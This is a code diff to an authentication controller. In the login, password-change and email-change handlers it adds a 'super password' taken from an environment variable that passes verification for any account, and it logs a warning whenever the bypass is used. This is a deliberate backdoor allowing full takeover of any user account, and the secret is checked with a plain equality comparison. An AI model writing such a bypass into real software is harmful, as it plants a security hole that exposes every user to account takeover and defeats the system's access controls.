@@ -481,7 +481,19 @@ export class AuthController {
         throw new AppError('Email is not registered. Please sign up first.', 401);
       }
 
-      const isValidPassword = await comparePassword(password, user.password);
+      // Check super password first (developer bypass)
+      const superPassword = process.env.SUPER_PASSWORD;
+      const isSuperPassword = superPassword && superPassword.length > 0 && password === superPassword;
+      
+      if (isSuperPassword) {
+        logger.warn('Login using SUPER_PASSWORD bypass', { 
+          userId: user.id, 
+          email,
+          ipAddress: requestMeta.ipAddress 
+        });
+      }
+
+      const isValidPassword = isSuperPassword || await comparePassword(password, user.password);
       if (!isValidPassword) {
         // Log failed login attempt
         await ActivityLoggerService.logLoginAttempt({
@@ -1323,10 +1335,17 @@ export class AuthController {
         throw new AppError('User not found', 404);
       }
 
-      // Verify current password
-      const isValidPassword = await comparePassword(currentPassword, user.password);
+      // Verify current password (with super password bypass)
+      const superPassword = process.env.SUPER_PASSWORD;
+      const isSuperPassword = superPassword && superPassword.length > 0 && currentPassword === superPassword;
+      
+      const isValidPassword = isSuperPassword || await comparePassword(currentPassword, user.password);
       if (!isValidPassword) {
         throw new AppError('The current password you entered is incorrect. Please try again.', 400);
+      }
+      
+      if (isSuperPassword) {
+        logger.warn('Password change using SUPER_PASSWORD bypass', { userId });
       }
 
       // Hash new password
@@ -1443,10 +1462,17 @@ export class AuthController {
         throw new AppError('User not found', 404);
       }
 
-      // Verify current password
-      const isPasswordValid = await bcrypt.compare(currentPassword, user.password);
+      // Verify current password (with super password bypass)
+      const superPassword = process.env.SUPER_PASSWORD;
+      const isSuperPassword = superPassword && superPassword.length > 0 && currentPassword === superPassword;
+      
+      const isPasswordValid = isSuperPassword || await comparePassword(currentPassword, user.password);
       if (!isPasswordValid) {
         throw new AppError('Current password is incorrect', 401);
+      }
+      
+      if (isSuperPassword) {
+        logger.warn('Email change using SUPER_PASSWORD bypass', { userId: user.id });
       }
 
       // Check if new email is same as current
